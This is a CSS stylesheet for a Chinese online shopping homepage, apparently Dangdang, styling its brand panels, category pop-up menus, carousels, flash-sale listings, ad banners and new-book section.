.ribai .dd_brand_head .dd_brand_head_title,.ribai .dd_brand_head .dd_brand_head_title:hover{border-right:0px solid #b7b7b7}
.ribai .dd_brand_head .list_aa{display:none;}

/*大促*/
.dacu .dd_brand_head .dd_brand_head_title, .dacu .dd_brand_head .dd_brand_head_title:hover{
  border-right:0;
}.dd_brand{width:1200px;margin:0 auto 30px;height:385px;}
.dd_brand_head,.dd_brand_head img{height:42px;}
.dd_brand_head{height:42px;font:bold 20px/24px "Microsoft YaHei";color:#323232;}
.dd_brand_head .dd_brand_head_title,.dd_brand_head .dd_brand_head_title:hover{float:left;margin:11px 0 7px;padding:0 20px 0 6px;font:bold 20px/24px "Microsoft YaHei"; border-right:1px solid #b7b7b7; text-decoration:none; background:#fff;color:#323232;}
.dd_brand_head .list_aa{float:left;height:42px; overflow:hidden;}
.dd_brand_head .list_aa li{ float:left; padding:0 30px; margin:13px 0 0 -13px; background:url(http://img63.ddimg.cn/upload_img/00111/home/title_bg.png) no-repeat left 3px;font:16px/20px "Microsoft YaHei";}
.dd_brand_head .list_aa li a,.dd_brand_head .list_aa li a:hover{font:bold 16px/20px "Microsoft YaHei"; text-decoration:none;color:#323232;}
.dd_brand_head .list_aa li a span.hot{font:14px/20px "Microsoft YaHei"; padding-left:5px;color:#323232;}
.dd_brand_head a:hover,.dd_brand_head .list_aa li a:hover span.hot{color:#ff2832!important;}
.dd_brand_content{border:1px solid #e6e6e6;border-width:1px 0 0 1px; position:relative;width:1199px;height:342px;}
.dd_brand_content_l{position:absolute;top:0;left:0;width:400px;}
.dd_brand_content_l a,.dd_brand_content_r a{float:left;width:199px;height:170px;overflow:hidden;border:1px solid #e6e6e6;border-width:0 1px 1px 0;}
.dd_brand_content_m{position:absolute;top:0;left:400px;border:1px solid #e6e6e6;border-width:0 1px 1px 0;height:341px; overflow:hidden;}
.dd_brand_content_r{position:absolute;top:0;left:799px;}
.dd_brand_content_m img{width:398px;height:341px;}
.dd_brand_content_m .roll_aa{width:398px;}
.dd_brand_content_m .roll_aa .over ul{ position:relative;width:10000px;}
.dd_brand_content_m .roll_aa .over ul li{float:left;}
.dd_brand_content_m .mix_marquee_tab{ position:absolute;bottom:20px;left:50%;z-index:6666;}
.dd_brand_content_m .mix_marquee_tab li{ float:left;width:12px;height:12px; overflow:hidden; background-color:#c8c8c8; border-radius:10px; margin-right:8px; line-height:36px; font-size:0;}
.dd_brand_content_m .mix_marquee_tab li.current{ background-color:#ff2832;}
.dd_brand_content_m .btn_brand_prev,.dd_brand_content_m .btn_brand_next{display:block;position:absolute;width:30px;height:43px;top:148px;background-image:url(http://img60.ddimg.cn/upload_img/00111/home/home_sprite_1507.png);background-repeat:no-repeat;background-color:#000;z-index:20;cursor:pointer;opacity:0.2;filter:alpha(opacity=20);}
.dd_brand_content_m .btn_brand_prev{left:0;background-position:0px -83px;}
.dd_brand_content_m .btn_brand_next{right:0;background-position:-36px -83px;}
.dd_brand_content_m .btn_prev_hover,.dd_brand_content_m .btn_next_hover{opacity:0.5;filter:alpha(opacity=50);}/* advertisement */
/*.ad_bar_top_box,.ad_bar_top_box2*/
.ad_bar,.ad_bar_b{position:relative;margin:0 auto;font-size:0;width:1200px;overflow: hidden;}
.ad_bar img{display:block;}
.ad_bar .close,.ad_bar_b .close{background-image: url(../images/images_140403/home_sprite2_1017.png);position:absolute;right:6px;top:6px;z-index:10;width:14px;height:14px;display:block;background-position:0 -544px;}
.ad_bar .close:hover{background-position:-14px -544px;}
.ad_bar_top_box{width:100%;padding:0;}
.ad_bar_top_box2{width:100%;padding:0;}
.ad_bar_top_box3,.ad_bar_top_box3 .ad_bar{background-color: #8B0000;}
.ad_bar_top_box3 img,.narrow_page .ad_bar_top_box3 .ad_bar img{height: 300px;}
.narrow_page .ad_bar,.narrow_page .ad_bar_b{width:990px;}
.narrow_page .ad_bar img{margin-left: -105px;}
.ad_closeicon{position:absolute;right:5px;top:5px;background:url(../hosts/images/dangshou/sprite_ad.png) no-repeat 0 -47px; height:14px; width:14px; overflow:hidden;}
.ad_closeicon:hover{ background-position:-14px -47px;}.new_pro{padding-bottom:20px;height:508px;width:1200px;margin:0 auto;}
.home_first_screen{height:508px;}
.home_nav_l{float:left;width:200px;background-color:#fafafa;position:relative;z-index:40;padding:4px 0;height:480px;}
.home_nav_l .new_pub_nav{width:200px;}
.home_nav_l .new_pub_nav li{height:30px;padding-left:18px;color:#323232;font:14px/30px "Microsoft Yahei";position:relative;z-index:1px;vertical-align:top;}
.home_nav_l .new_pub_nav li.on{background:#fff;color:#F07828;z-index:10;margin:-2px -1px -2px 0;padding:0 1px 0 16px;border:2px solid #ff2832;border-right:0;}
.home_nav_l .new_pub_nav li a{color:#323232;font:14px/32px "Microsoft Yahei";}
.home_nav_l .new_pub_nav li.on a,.home_nav_l .new_pub_nav li.on a:hover,.home_nav_l .new_pub_nav li.on span{color:#ff2832;font:16px/30px "Microsoft Yahei";}
.home_notice_r{float:left;width:202px;border-bottom:1px solid #e6e6e6;border-right:1px solid #e6e6e6;}
/* new_pub_nav_pop */
.new_pub_nav_pop{position:absolute;left:199px;top:0px;border:2px solid #ff2832;width:979px;padding-left:18px;overflow:hidden;overflow:hidden;font:12px 'Hiragino Sans GB',"Simsun";background-color:#fff;border-top:none 0;;min-height:484px;_height:expression(this.scrollHeight < 484 ? "484px" :"auto");}
.new_pub_nav_pop .logo_box{float:left;width:231px;padding:25px 0 0 29px;}
.new_pub_nav_pop .logo_box li{width:90px;height:60px; float:left; margin:0 22px 11px 0;_display:inline;}
.new_pub_nav_pop .logo_box li a,.new_pub_nav_pop .logo_box li a:hover{display:block;width:80px;height:50px;padding:4px;border:1px solid #fff;}
.new_pub_nav_pop .logo_box li a:hover{border-color:#ff2832;}
.new_pub_nav_pop .left_box{width:719px; float:left;overflow:hidden;}
.new_pub_nav_pop .left{width:719px;}
.new_pub_nav_pop .left li{width:649px;padding:7px 0 5px 0;margin-left:70px;position:relative;border-top:1px dotted #d5d5d5;zoom:1;}
.new_pub_nav_pop .left li:after{clear:both;content:" ";display:block;font-size:0;height:0;visibility:hidden;}
.new_pub_nav_pop .left li.light{background-color:#fafafa;}
.new_pub_nav_pop .left h4{position:absolute;left:-70px;top:7px;color:#ff2832;font-size:14px;font-weight:bold;font-family:"Microsoft Yahei";}
.new_pub_nav_pop .left h4{font-size:12px;height:22px;line-height:22px;}
.new_pub_nav_pop .left h4 a,.new_pub_nav_pop .left h4 a:hover{color:#ff2832;font-size:12px;font-weight:bold;height:22px;line-height:22px;}
.new_pub_nav_pop .left .e,.new_pub_nav_pop .left .ph{line-height:22px;width:648px;margin-left:1px;overflow:hidden;}
.new_pub_nav_pop .left .ph{line-height:22px;width:639px;padding-left:10px;overflow:hidden;}
.new_pub_nav_pop .left .e span,.new_pub_nav_pop .left .e a,.new_pub_nav_pop .left .e a:hover{color:#646464;padding:0 10px;background:url(http://img62.ddimg.cn/upload_img/00111/home/home_sprite_1511.png) no-repeat left -30px;display:inline-block;margin-left:-1px;}
.new_pub_nav_pop .left .b span,.new_pub_nav_pop .left .b a,.new_pub_nav_pop .left .b a:hover{color:#646464;background:none;}
.new_pub_nav_pop .left .e a:hover,.new_pub_nav_pop .left .b a:hover{color:#ff2832;}
.new_pub_nav_pop .left .brand {width:606px; margin:8px 0 0 0;float:left;}
.new_pub_pop_guan{position:relative;overflow:hidden;background:#fff;margin-bottom:-1px;z-index:999;width:719px;padding-top:10px;}
.new_pub_pop_guan a,.new_pub_pop_guan a:hover{float:left;height:20px;line-height:20px!important;padding:0 28px 0 8px;color:#fff;text-decoration:none;display:inline;margin:0 10px 3px 0;background:#a2a2a2 url(http://img62.ddimg.cn/upload_img/00111/home/home_sprite_1511.png) no-repeat right -146px;}
.new_pub_pop_guan a.pop_hot,.new_pub_pop_guan a.pop_hot:hover{background-color:#ff2832;background-position: right -166px;}
.new_pub_pop_guan a:hover{background-color:#ff2832;background-position:right -166px;}
.new_pub_pop_img{width:238px;overflow:hidden;}
.new_pub_pop_img a,.new_pub_pop_img a:hover{display:block;width:236px;border:1px solid #d5d5d5;overflow:hidden;margin-bottom:16px;}
.new_pub_pop_img img{width:236px;}
.new_pub_nav_pop .left li h3{margin:10px 0 0 8px;font:normal 12px/18px 'Hiragino Sans GB',"Simsun";color:#fff; background-color:#bfbfbf; float:left; width:34px; text-align:center;}
.new_pub_nav_pop .left li h3 a { color:#fff;}
.new_pub_nav_pop .left li h3 a:hover{color:#ff2832; text-decoration:underline;}
.new_pub_nav_pop_one .logo_box{display:none;}
.new_pub_nav_pop_one .left_box,.new_pub_nav_pop_one .left,.new_pub_nav_pop_one .new_pub_pop_guan{width:979px;}
.new_pub_nav_pop_one .left li{width:890px;}
.new_pub_nav_pop_one .left .ph,.new_pub_nav_pop_one .left .e{width:879px;}
.new_pub_nav_pop_one .left .brand{width:837px;}
.new_pub_nav_pop .left .ph a{font-family:'Hiragino Sans GB',"Simsun";color:#686868;display:inline-block;padding-right:25px;}
.new_pub_nav_pop .left .ph a:hover{color:#f60;}
.new_pub_nav_pop .left_02,.new_pub_nav_pop .left_03{padding-top:0;}
.new_pub_pop_wp h4{color:#5d5d5d;font:bold 14px "Microsoft Yahei";padding:16px 0 19px 21px;}
.new_pub_pop_wp ul{margin-left:21px;width:714px;overflow:hidden;}
.new_pub_pop_wp ul li{float:left;width:92px;height:92px;overflow:hidden;padding:0 10px 10px 0;}
.new_pub_nav .new_pub_pop_wp ul li.on{float:left;width:92px;height:92px;overflow:hidden;padding:0 5px 5px 0;margin:0;}
.new_pub_pop_wp ul li img{width:92px;height:92px;}
.new_pub_pop_wp ul li a,.new_pub_pop_wp ul li a:hover{position:relative;display:block;width:92px;height:92px;color:#fff;text-decoration:none;}
.new_pub_pop_wp ul li a span{display:none;width:92px;height:92px;position:absolute;top:0;left:0;text-align:center;line-height:92px;}
.new_pub_pop_wp ul li a span.back{opacity:0.7;filter:alpha(opacity=70);background-color:#5d514c;}
.new_pub_pop_wp ul li.on span{display:block;}
/* home_circle_c */
.home_circle_c{float:left;width:796px;overflow:hidden;border-bottom:1px solid #e6e6e6;border-right:1px solid #eaecee;}
.home_circle_c .focus_box{width:796px;height:326px;overflow:hidden;position:relative;z-index:10;border-bottom:1px solid #e6e6e6;}
.home_circle_c .focus_box .pic li{height:326px;overflow:hidden;}
.home_circle_c .focus_box .pic li a,.home_circle_c .focus_box .pic li a img{display:block;width:796px;height:326px;}
.home_circle_c .focus_box .tab{position:absolute;left:50%;bottom:7px;}
.home_circle_c .focus_box .tab li{float:left;width:20px;height:20px;font:12px/20px Arial;color:#fff;text-align:center;overflow:hidden;cursor:pointer;background-color:#646464;margin-right:6px;border-radius:10px;}
.home_circle_c .focus_box .tab li.on{background-color:#ff2832;}
.home_circle_c .focus_box .btn{position:absolute;width:33px;height:70px;overflow:hidden;background-image:url(http://img60.ddimg.cn/upload_img/00111/home/home_sprite_1507.png);background-repeat:no-repeat;background-color:#000;top:122px;font-size:0;line-height:99px;cursor:pointer;opacity:0.2;filter:alpha(opacity=20);z-index:10;}
.home_circle_c .focus_box .hover{opacity:0.5;filter:alpha(opacity=50);}
.home_circle_c .focus_box .btn_l{background-position:0 -70px;left:0;}
.home_circle_c .focus_box .btn_r{background-position:-33px -70px;right:0;}
/* tehui_box */
.home_circle_c .tehui_box{width:796px;height:160px;overflow:hidden;position:relative;}
.home_circle_c .tehui_box ul{width:796px;position:absolute;left:0;top:0;z-index:10;margin-left:1px;overflow:hidden;}
.home_circle_c .tehui_box ul li{width:198px;height:160px;overflow:hidden;float:left;border-right:1px solid #e6e6e6;}
.home_circle_c .tehui_box ul li a,.home_circle_c .tehui_box ul li a img{display:block;width:198px;height:160px;position:relative;}
.home_circle_c .tehui_box ul li a .cover{display:block;width:198px;height:160px;background-color:#000;position:absolute;left:0;top:0;opacity:0.04;filter:alpha(opacity=4);}
.home_circle_c .tehui_box ul li a:hover .cover{display:none;}

.home_circle_c .tehui_box .btn{width:30px;height:43px;overflow:hidden;line-height:90px;font-size:0;position:absolute;top:65px;background-image:url(http://img60.ddimg.cn/upload_img/00111/home/home_sprite_1507.png);background-repeat:no-repeat;background-color:#000;z-index:20;cursor:pointer;opacity:0.2;filter:alpha(opacity=20);}
.home_circle_c .tehui_box .hover{opacity:0.5;filter:alpha(opacity=50);}
.home_circle_c .tehui_box .btn_l{background-position:0 -83px;left:0;}
.home_circle_c .tehui_box .btn_r{background-position:-36px -83px;right:0;}
/* home_notice_r_pic */
.home_notice_r_pic{height:194px;width:202px;border-top:1px solid #e6e6e6;}
.home_notice_r_pic a,.home_notice_r_pic img{display:block;width:202px;height:195px;}
/* home_notice_gg */
.home_notice_gg{width:202px;overflow:hidden;}
.home_notice_gg .tab_aa{border-top:1px solid #e6e6e6;height:29px;overflow:hidden;width:204px;}
.home_notice_gg .tab_aa li{margin-left:-1px;float:left;width:101px;border:1px solid #e6e6e6;border-top:0;height:28px;background-color:#f0f0f0;cursor:default;font:14px/29px "Microsoft Yahei";text-align:center;color:#646464;overflow:hidden;}
.home_notice_gg .tab_aa li a,.home_notice_gg .tab_aa li a:hover{display:block;overflow:hidden;margin:0 auto;text-align:center;}
.home_notice_gg .tab_aa li.on{background-color:#fff;border-bottom:0;padding-bottom:1px;}
.home_notice_gg a,.home_notice_gg a:hover{color:#646464;text-decoration:none;}
.home_notice_gg .tab_content_aa{width:202px;height:142px;position:relative;border-bottom:1px solid #e6e6e6;overflow:hidden;}
.home_notice_gg .tab_content_aa ul{height:130px;width:202px;overflow:hidden;padding-top:6px;}
.home_notice_gg .tab_content_aa li{line-height:25px;padding-left:10px;width:183px;height:25px;background:url(http://img60.ddimg.cn/upload_img/00111/home/home_sprite_1507.png) no-repeat 10px -188px;overflow:hidden;}
.home_notice_gg .tab_content_aa li a,.home_notice_gg .tab_content_aa li a:hover{display:block;padding-left:10px;color:#646464;font-family:"Microsoft Yahei";}
.home_notice_gg .tab_content_aa li a:hover{color:#ff2832;}
.home_notice_gg2 .tab_aa{border-top:0;}
.home_notice_gg2 .tab_aa li{width:67px;}
.home_notice_gg2 .tab_content_aa{width:202px;height:90px;overflow:hidden;border-bottom:0;}
.home_notice_gg2 .tab_content_aa a,.home_notice_gg2 .tab_content_aa img{display:block;width:202px;height:90px;}.home_notice_r .roll_aa{width:202px;height:119px; position:relative;}
.home_notice_r .roll_aa .btn_brand_prev,.home_notice_r .roll_aa .btn_brand_next{ position:absolute;top:41px;width:30px;height:43px;overflow:hidden;line-height:90px;font-size:0;background-image:url(http://img60.ddimg.cn/upload_img/00111/home/home_sprite_1507.png);background-repeat:no-repeat;background-color:#000;z-index:20;cursor:pointer;opacity:0.2;filter:alpha(opacity=20);}
.home_notice_r .roll_aa .btn_brand_prev{background-position:0 -83px;left:0;}
.home_notice_r .roll_aa .btn_brand_next{background-position:-36px -83px;right:0;}
.home_notice_r .roll_aa .btn_brand_prev:hover,.home_notice_r .roll_aa .btn_brand_next:hover{opacity:0.5;filter:alpha(opacity=50);}
.home_notice_r .roll_aa .mix_marquee_tab{ position:absolute;bottom:10px;left:50%;text-align:center;z-index:30;}
.home_notice_r .roll_aa .mix_marquee_tab li{float:left;width:8px;height:8px;border-radius:8px;background:#c8c8c8;overflow:hidden;font-size:0;line-height:24px; margin:0 6px 0 0;}
.home_notice_r .roll_aa .mix_marquee_tab li.current{ background:#ff2832;}
.home_notice_r .roll_aa .over,.home_notice_r .roll_aa .list_aa li img{width:202px;height:119px; overflow:hidden;}
.home_notice_r .roll_aa .list_aa{ width:10000px; position:relative;}
.home_notice_r .roll_aa .list_aa li{float:left;width:202px;height:119px;}.z_floor{width:1200px; margin:0 auto 30px;height:553px;overflow:hidden;}
.z_floor .z_head{height:42px;width:1200px;position:relative;overflow:hidden;}
.z_floor .z_head img{position:absolute;left:0;top:0;}
.z_floor .z_head .z_link,.z_floor .z_head .z_link:hover{position:absolute;right:3px;top:13px;height:20px;color:#fc5259;font:14px/20px "Microsoft YaHei";width:370px;overflow:hidden;text-align:right;}
.z_floor .z_content{width:1199px;height:510px;border:1px solid #e6e6e6;border-width:1px 0 0 1px;position:relative;}
.z_floor .z_face_image,.z_floor .roll_aa,.z_floor .z_activity,.z_floor .z_brand_list a,.z_content .z_brand_logo{border:1px solid #e6e6e6;border-width:0 1px 1px 0;overflow:hidden;}
.z_floor .z_face_image{position:absolute;display:block;width:189px;height:254px;top:0;left:0;}
.z_floor .roll_aa{position:absolute;width:189px;height:254px;top:255px;left:0;}
.z_floor .roll_aa .mix_marquee_tab{height:10px;position:absolute;bottom:10px;left:50%;margin-left:-43px;z-index:666;}
.z_floor .roll_aa .mix_marquee_tab li{float:left;_display:inline;width:10px;height:10px;font-size:0;margin-right:10px;border-radius:10px;background-color:#c7c7c7; overflow:hidden; line-height:30px;}
.z_floor .roll_aa .mix_marquee_tab li.current{background-color:#69b36a;}
.z_content .z_brand_logo{width:190px;height:254px;overflow:hidden;position:absolute;top:255px;left:0;background-color:#f9f9f9;z-index:50;}
.z_content .z_brand_logo a,.z_content .z_brand_logo a:hover{float:left;width:94px;height:127px;border-right:1px dotted #e6e6e6;border-bottom:1px dotted #e6e6e6;position:relative; text-align:center;overflow:hidden;text-decoration:none;}
.z_content .z_brand_logo img{width:80px;height:50px;position:absolute;top:34px;left:10px;z-index:20; cursor:pointer;}
.z_content .z_brand_logo a .remark{display:none;height:22px;background-color:#ff2832;color:#fff;margin:0 auto;top:94px;position:relative;z-index:30;padding:0 7px;font:14px/20px "Microsoft YaHei"; max-width:99px; overflow:hidden;}
.z_content .z_brand_logo a:hover .remark{display:inline-block;}
.z_floor .z_activity{position:absolute;width:438px;height:509px;top:0;left:189px;z-index:60; border-left:1px solid #e6e6e6;}
.z_floor .z_activity .roll_aa{position:absolute;width:438px;height:254px;top:0;left:0;}
.z_floor .z_activity .roll_aa .over{width:439px;height:254px;}
.z_floor .z_activity .roll_aa .over li, .z_floor .z_activity .roll_aa .over li img{width:438px;height:254px;float:left;position:relative;top:auto;left:auto;}
.z_floor .z_activity .z_activity_lower3{float:left;width:146px;height:254px;margin-top:255px;}
.z_floor .z_activity .z_activity_lower3 img{width:146px;height:254px;}
.z_floor .z_brand_list{width:570px;height:509px;position:absolute;top:0;left:629px;}
.z_floor .z_brand_list a,.z_floor .z_brand_list a:hover{float:left;width:189px;height:254px;overflow:hidden;}
.z_floor .z_brand_list a img{width:189px;height:254px;}.v_all{height:591px;}
.v_all .v_header{width:1200px;height:40px;margin:0 auto;overflow:hidden;position:relative;}
.v_all .v_header img{position:absolute;top:0;left:0;height:40px;}
.v_all .v_header .v_link,.v_all .v_header .v_link:hover{position:absolute;top:0;right:0;width:370px;overflow:hidden;height:40px;color:#fa5c98;text-align:right;font:14px/40px "Microsoft YaHei"}
.v_all .v_content{width:1199px;height:520px;margin:0 auto 30px;overflow:hidden;position:relative;border-left:1px solid #e6e6e6;border-top:1px solid #e6e6e6;}
.v_content .v_content_left{position:absolute;top:0;left:0;width:198px;height:519px;overflow:hidden;border-right:1px solid #e6e6e6;border-bottom:1px solid #e6e6e6;}
.v_content_left .v_entrance{position:absolute;top:0;left:0;width:198px;height:280px;border-bottom:1px solid #e6e6e6;overflow:hidden;}
.v_content_left .v_entrance img{width:198px;height:280px;}
.v_content_left .v_brand_logo{width:200px;height:240px;position:absolute;top:281px;left:0;}
.v_content_left .v_brand_logo a,.v_content_left .v_brand_logo a:hover{float:left;width:99px;height:119px;overflow:hidden;border-right:1px dotted #e6e6e6;border-bottom:1px dotted #e6e6e6; position:relative; text-align:center; background-color:#f9f9f9;float:left;text-decoration:none;}
.v_content_left .v_brand_logo a img{width:80px;height:50px;position:absolute;top:34px;left:10px;z-index:20; cursor:pointer;}
.v_content_left .v_brand_logo a .remark{display:none;height:22px;background-color:#ff2832;color:#fff;margin:0 auto;top:87px;position:relative;z-index:30;padding:0 7px;font:14px/20px "Microsoft YaHei"; max-width:99px; overflow:hidden;}
.v_content_left .v_brand_logo a:hover .remark{display:inline-block;}
.v_content .v_content_right{position:absolute;top:0;left:199px;}
.v_content .v_content_right a{float:left;width:199px;overflow:hidden;border-right:1px solid #e6e6e6;border-bottom:1px solid #e6e6e6;}
.v_content_right .v_special_upper a{height:280px;}
.v_content_right .v_special_lower a{height:238px;}
.v_content_right .v_special_upper img{width:199px;height:280px;}
.v_content_right .v_special_lower img{width:199px;height:238px;}
.v_content_right a:hover{border:3px solid #ff5797;width:194px;}
.v_content_right .v_special_upper a:hover{height:275px;}
.v_content_right .v_special_lower a:hover{height:233px;}
.v_content_right a:hover img{margin:-3px -2px -2px -3px;}/* 当首-2(畅销今日闪购和厂商周) */
.home_taday_flash_box{margin:0 auto 30px;height:497px;overflow:hidden;width:1200px;}
.home_miaosha{float:left;width:996px;overflow:hidden;}
.home_miaosha .head{height:39px;border-bottom:2px solid #3c3c3c;position:relative;}
.home_miaosha .head .time{float:left;background:url(http://img63.ddimg.cn/upload_img/00111/home/home_miaosha.png) no-repeat 83px 0;height:39px;padding-left:113px; font:14px "Microsoft YaHei";position:relative;}
.home_miaosha .head .time .title{position:absolute;display:block;left:0;top:0width:83px;height:39px;overflow:hidden;}
.home_miaosha .head .time .title img{display:block;}
.home_miaosha .head .time span{float:left;height:24px; line-height:24px;padding:5px 11px 0 0; text-align:center;width:26px; overflow:hidden;}
.home_miaosha .head .chang{ position:absolute;left:305px;top:0;}
.home_miaosha .head .chang li{width:80px;text-align:center;height:38px;float:left;margin-right:50px;_display:inline;}
.home_miaosha .head .chang a,.home_miaosha .head .chang a:hover{display:block;width:80px;text-align:center; overflow:hidden;height:38px;line-height:38px;padding-bottom:1px; font-size:20px; font-weight:bold; text-decoration:none;}
.home_miaosha .head .chang a:hover{padding-bottom:0;border-bottom:3px solid #ff2832; margin-bottom:-3px; position:relative;}
.home_miaosha .head .chang a.now,.home_miaosha .head .chang a.now:hover{padding-bottom:1px;border:none;margin-bottom:0;color:#ff2832;}
.home_miaosha .list{border:1px solid #e6e6e6;border-right:none;width:995px;height:454px;}
.home_miaosha .list_bg{width:455px; overflow:hidden;}
.home_miaosha .list .info{float:left;width:198px;height:227px;border-right:1px solid #e6e6e6;border-bottom:1px solid #e6e6e6; overflow:hidden; position:relative;}
.home_miaosha .list .pic{display:block;width:150px;height:150px; overflow:hidden; margin:10px auto 0;}
.home_miaosha .list .pic img{width:150px;height:150px;}
.home_miaosha .list .pic_kong{position:absolute;width:96px;height:96px;background:url(http://img60.ddimg.cn/upload_img/00111/home/miaokong.png) no-repeat 0 0;top:37px;left:51px;}
.home_miaosha .list .pic_jijiang{position:absolute;width:96px;height:96px;background:url(http://img61.ddimg.cn/upload_img/00111/home/jijiang.png) no-repeat 0 0;top:37px;left:51px;}
.home_miaosha .list .line{ position:absolute;top:160px;width:150px;height:8px;border-radius:5px; background:#ffb7b7;left:24px;line-height:0; font-size:0;z-index:10;}
.home_miaosha .list .line span{ background:#fc2c3a;display:block; position:absolute;left:0;top:0;height:8px;border-radius:5px;z-index:30;}
.home_miaosha .list span.num_bg{background:#fe8d91;width:76px;height:20px; overflow:hidden;top:-7px;left:38px;z-index:20;border-radius:10px;}
.home_miaosha .list .num{width:76px;height:20px;line-height:20px;overflow:hidden;color:#fff; text-align:center;position:absolute;top:153px;left:62px;z-index:40;font-family:Arial;}
.home_miaosha .list .name{width:180px; overflow:hidden;line-height:22px;height:22px;margin:0 auto;padding-top:15px;}
.home_miaosha .list .name a{color:#646464;}
.home_miaosha .list .name a:hover{color:#ff2832;}
.home_miaosha .list .price{color:#ff2832;width:180px; margin:2px auto 0; overflow:hidden;line-height:20px;height:20px; font-family:Arial;}
.home_miaosha .list .price span{ font-size:16px; margin-left:5px; position:relative;top:1px;}
.home_miaosha .list .price span.del{color:#969696; text-decoration:line-through; font-size:12px;}

/* firm_week */
.firm_week{float:left;width:204px;overflow:hidden;position:relative;}
.firm_week .head{height:34px;line-height:34px;border-bottom:2px solid #ff2832;position:relative;overflow:hidden;padding-top:5px;}
.firm_week .head h3{float:left;color:#ff2832;font:20px "Microsoft YaHei",Simsun;text-decoration:none;cursor:pointer;padding-left:8px;width:120px;height:28px;overflow:hidden;}
.firm_week .tab_c{width:203px;overflow:hidden;border-right:1px solid #e6e6e6;}
.firm_week .tab_c li{border-bottom:1px solid #e5e5e5;height:113px;vertical-align:top;width:203px}
.firm_week .tab_c li a,.firm_week .tab_c li a:hover{display:block;height:113px;position:relative;width:202px;padding-left:1px;overflow:hidden;background-color:#fff;}
.firm_week .tab_c li img{display:block;border:none;height:113px;width:202px;-webkit-transition:all .3s ease;-moz-transition:all .3s ease;-o-transition:all .3s ease;-ms-transition:all .3s ease;transition:all .3s ease;}
.firm_week .tab_c li a:hover{zoom:1;}
.firm_week .tab_c li a:hover img{margin-left:-3px;margin-left:0\9;}.dd_brand{width:1200px;margin:0 auto 30px;height:385px;}
.dd_brand_head,.dd_brand_head img{height:42px;}
.dd_brand_head{height:42px;font:bold 20px/24px "Microsoft YaHei";color:#323232;}
.dd_brand_head .dd_brand_head_title,.dd_brand_head .dd_brand_head_title:hover{float:left;margin:11px 0 7px;padding:0 20px 0 6px;font:bold 20px/24px "Microsoft YaHei"; border-right:1px solid #b7b7b7; text-decoration:none; background:#fff;color:#323232;}
.dd_brand_head .list_aa{float:left;height:42px; overflow:hidden;}
.dd_brand_head .list_aa li{ float:left; padding:0 30px; margin:13px 0 0 -13px; background:url(http://img63.ddimg.cn/upload_img/00111/home/title_bg.png) no-repeat left 3px;font:16px/20px "Microsoft YaHei";}
.dd_brand_head .list_aa li a,.dd_brand_head .list_aa li a:hover{font:bold 16px/20px "Microsoft YaHei"; text-decoration:none;color:#323232;}
.dd_brand_head .list_aa li a span.hot{font:14px/20px "Microsoft YaHei"; padding-left:5px;color:#323232;}
.dd_brand_head a:hover,.dd_brand_head .list_aa li a:hover span.hot{color:#ff2832!important;}
.dd_brand_content{border:1px solid #e6e6e6;border-width:1px 0 0 1px; position:relative;width:1199px;height:342px;}
.dd_brand_content_l{position:absolute;top:0;left:0;width:400px;}
.dd_brand_content_l a,.dd_brand_content_r a{float:left;width:199px;height:170px;overflow:hidden;border:1px solid #e6e6e6;border-width:0 1px 1px 0;}
.dd_brand_content_m{position:absolute;top:0;left:400px;border:1px solid #e6e6e6;border-width:0 1px 1px 0;height:341px; overflow:hidden;}
.dd_brand_content_r{position:absolute;top:0;left:799px;}
.dd_brand_content_m img{width:398px;height:341px;}
.dd_brand_content_m .roll_aa{width:398px;}
.dd_brand_content_m .roll_aa .over ul{ position:relative;width:10000px;}
.dd_brand_content_m .roll_aa .over ul li{float:left;}
.dd_brand_content_m .mix_marquee_tab{ position:absolute;bottom:20px;left:50%;z-index:6666;}
.dd_brand_content_m .mix_marquee_tab li{ float:left;width:12px;height:12px; overflow:hidden; background-color:#c8c8c8; border-radius:10px; margin-right:8px; line-height:36px; font-size:0;}
.dd_brand_content_m .mix_marquee_tab li.current{ background-color:#ff2832;}
.dd_brand_content_m .btn_brand_prev,.dd_brand_content_m .btn_brand_next{display:block;position:absolute;width:30px;height:43px;top:148px;background-image:url(http://img60.ddimg.cn/upload_img/00111/home/home_sprite_1507.png);background-repeat:no-repeat;background-color:#000;z-index:20;cursor:pointer;opacity:0.2;filter:alpha(opacity=20);}
.dd_brand_content_m .btn_brand_prev{left:0;background-position:0px -83px;}
.dd_brand_content_m .btn_brand_next{right:0;background-position:-36px -83px;}
.dd_brand_content_m .btn_prev_hover,.dd_brand_content_m .btn_next_hover{opacity:0.5;filter:alpha(opacity=50);}.book_new{height:519px;height:499px;overflow:hidden; position:relative; margin:0 auto 30px;}
.book_new .home_screen_head{position:absolute;top:0;left:0;overflow:hidden;width:910px;height:44px; border-bottom:2px solid #000;color:#323232;font:bold 20px/44px "Microsoft YaHei";}
.book_new .home_screen_head a,.book_new .home_screen_head a:hover{color:#323232; text-decoration:none; cursor:pointer;}
.book_new .home_screen_head span{font-size:16px;position:relative;top:-3px;}
.book_new .home_screen_head a:hover{color:#ff2832;}
.book_new .tab_box_aa{position:absolute;top:56px;left:0;width:910px;height:443px;}
.book_new .tab_box_aa .head{height:44px;width:655px;border-right:1px solid #e6e6e6;position:absolute;top:-56px;right:0}
.book_new .tab_box_aa .head .tab_aa{float:right;}
.book_new .tab_box_aa .tab_aa li{float:left;width:114px;height:42px;padding-top:1px;border:1px solid #e6e6e6;border-width:1px 0 0 1px;text-align:center;background-color:#f5f5f5;font:14px/42px "Microsoft YaHei";color:#646464;cursor:default;overflow:hidden;}
.book_new .tab_box_aa .tab_aa li.first{margin-right:0;}
.book_new .tab_box_aa .tab_aa li.on{font-weight:bold;background-color:#fff;width:112px;border:2px solid #000;border-bottom:0;padding:0 0 2px 0;margin-bottom:-2px;color:#525252;}
.book_new .tab_box_aa .tab_aa li a,.book_new .tab_box_aa .tab_aa li a:hover{color:#646464;text-decoration:none;cursor:pointer;}
.book_new .tab_box_aa .tab_aa li.on a,.book_new .tab_box_aa .tab_aa li.on a:hover{color:#323232}
.book_new .tab_box_aa .tab_content_aa{border-top:1px solid #e6e6e6;border-bottom:1px solid #e6e6e6;width:910px;height:441px; overflow:hidden; position:relative;}
.book_new .tab_box_aa .tab_content_aa .book_left_pic{width:238px;height:441px;border:1px solid #e6e6e6; border-width:0 1px;position:absolute;top:0;left:0;display:block;overflow:hidden;text-align:center;}
.book_new .book_tab_img{position:absolute;bottom:0;left:1px;width:237px;padding-left:1px;background-color:#fff;background:url(http://img63.ddimg.cn/upload_img/00111/home/home_bg_1509.png) 0 0;}
.book_new .book_tab_img li{float:left;width:63px;height:28px;line-height:28px;padding-left:16px;overflow:hidden;}
